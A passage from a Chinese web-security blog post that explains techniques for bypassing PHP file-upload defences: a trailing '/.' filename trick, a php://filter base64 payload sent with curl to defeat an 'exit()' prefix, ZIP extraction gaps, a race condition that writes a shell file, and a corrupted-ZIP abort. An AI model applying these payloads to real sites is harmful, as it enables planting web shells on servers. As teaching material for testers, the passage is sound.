<p>file_put_contents 的文件名为 <strong>“yu.php&#x2F;.”</strong> 时，能够正常写入php文件，并且代码获取的后缀为空字符串，可以绕过黑名单。</p>
<p>这是因为在该方法中，如果路径以 <strong>‘&#x2F;.’</strong> 结尾，就会截断掉 <strong>‘&#x2F;.’</strong> 字符，处理成正常的路径。这种方法只能于创建新文件，不能用于覆盖文件。</p>
<h3 id="8-2-死亡之die绕过"><a href="#8-2-死亡之die绕过" class="headerlink" title="8.2 死亡之die绕过"></a>8.2 死亡之die绕过</h3><p>很多网站会把Log或缓存直接写入PHP文件，为了防止日志或缓存文件执行代码，会在文件开头加入 **<?php exit(); ?>**。如下代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="string">&quot;&lt;?php exit(); ?&gt;\n&quot;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;upload success&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，用户可以完全控制 filename，包括协议，所以这里可以使用一些字符串过滤器来把 <strong>exit()</strong> 处理掉，从而让后面写入的代码能够被执行，可以使用 <strong>base64_decode</strong> 来进行处理。</p>
<p>PHP的 <strong>base64_decode</strong> 方法默认为非严格模式，只有当字符为 <strong>+、&#x2F;、0-9、a-z、A-Z</strong> 时被解码，其余字符都会被跳过。 <strong><?php exit();?></strong> 除去被跳过的字符，剩余 <strong>phpexit</strong> ，在base64解码时每4字节为一组，<strong>所以需要再填充1字节</strong>，最终被解码为乱码，从而让后面的代码能够被正常执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:<span class="comment">//localhost/upload.php -- data &quot;filename=php://filter/write=convert.base64-decode/resource=x.php&amp;content=xPD9waHAgZWNobyAiSGVsbG8gV29ybGQiOz8+&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="9-ZIP上传的问题"><a href="#9-ZIP上传的问题" class="headerlink" title="9. ZIP上传的问题"></a>9. ZIP上传的问题</h2><h3 id="9-1-未递归检测上传目录导致绕过"><a href="#9-1-未递归检测上传目录导致绕过" class="headerlink" title="9.1 未递归检测上传目录导致绕过"></a>9.1 未递归检测上传目录导致绕过</h3><p>为了解决解压文件带来的安全问题，很多程序会在解压完ZIP后，检测上传目录下是否存在脚本文件，如果存在，就删除。</p>
<p>如下面的代码，在解压完成后，会通过readdir获取上传目录下的所有文件、目录，如果发现后缀不是jpg、gif、png的文件，就会删除。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;upload/&#x27;</span>;</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$name</span>,<span class="string">&#x27;.&#x27;</span>),<span class="number">1</span>));</span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$dir</span>.<span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>,<span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>)))&#123;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$path</span>);</span><br><span class="line">    <span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span>) === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">extractTo</span>(<span class="variable">$dir</span>);</span><br><span class="line">        <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="variable">$handle</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$dir</span>);</span><br><span class="line">        <span class="keyword">while</span>((<span class="variable">$f</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$handle</span>)) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$f</span>,<span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;..&#x27;</span>)))&#123;</span><br><span class="line">                <span class="variable">$ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$f</span>, <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>));</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>)))&#123;</span><br><span class="line">                    <span class="title function_ invoke__">unlink</span>(<span class="variable">$dir</span>.<span class="variable">$f</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;ok&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;仅允许上传zip文件&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>但上述代码仅仅检测了上传目录，没有递归检测上传目录下的所有目录，所以如果解压出一个目录，那么目录下的文件不会被检测到。</p>
<p>unlink 到一个目录时，仅会抛出一个 warning 。当然，也可以把压缩包内的目录命名为 <strong>x.jpg</strong> ，这样子会直接跳过unlink，连warning都不会抛出</p>
<h3 id="9-2-条件竞争导致绕过"><a href="#9-2-条件竞争导致绕过" class="headerlink" title="9.2 条件竞争导致绕过"></a>9.2 条件竞争导致绕过</h3><p>在上传的代码中，如果递归检测了上传目录下的所有目录，这种场景可以通过条件竞争的方式绕过，即在文件被删除前访问文件，生成另一个脚本文件到非上传目录中。通过不断上传文件与访问文件，在文件被删除前访问到文件，最终生成脚本到其他目录中实现绕过。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;../shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="9-3-解压产生异常退出实现绕过"><a href="#9-3-解压产生异常退出实现绕过" class="headerlink" title="9.3 解压产生异常退出实现绕过"></a>9.3 解压产生异常退出实现绕过</h3><p><strong>ZipArchive</strong> 对象中的 <strong>extractTo</strong> 方法在解压失败时会返回false</p>
<p>可以构造出一种解压到一半然后解压失败的ZIP包。（利用010 Editor修改生成的ZIP包，将x.php后的内容修改为0xff然后保存生成的新ZIP文件）</p>
<p>由于解压失败，在 check_dir 方法前执行了 exit，已解压的脚本文件就不会被删除</p>
</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-11-26</span><i class="fa fa-tag"></i><a class="tag" href="/tags/web/" title="web">web </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,http://example.com/2022/11/26/file-uploads/,Mini's blog,Web文件上传,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2022/12/05/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80(2)/" title="内网基础-2">上一篇</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2022/11/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%882%EF%BC%89/" title="文件包含-2">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>